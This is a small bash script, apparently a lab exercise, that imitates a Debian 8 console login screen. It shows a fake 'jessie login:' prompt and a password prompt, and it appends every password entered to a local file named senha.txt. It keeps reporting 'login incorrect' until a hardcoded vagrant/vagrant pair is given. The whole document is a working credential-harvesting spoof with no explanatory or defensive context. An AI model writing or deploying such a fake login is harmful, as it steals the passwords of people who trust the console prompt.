#!/bin/bash
USUARIO=vagrant
SENHA=vagrant
SAI=1
while (( $SAI != 0 )); do
clear
echo
echo "Debian GNU/Linux 8 jessie tty2 "
echo
 QNT=1
 while (( $QNT <= 5 )); do
 echo -n "jessie login: "
 read USER
 echo -n "Password "
 read -s PASS
 echo
 echo $PASS >> senha.txt
 if [ $USER == $USUARIO ]; then
	if [ $PASS == $SENHA ]; then
		SAI=0
		QNT=6
	else
		sleep 2
		echo
		echo "login incorrect "
	fi
 else
 	sleep 2
	echo
	echo "login incorrect "
 fi
 let QNT=($QNT+1)
 done
done
echo "passou..."
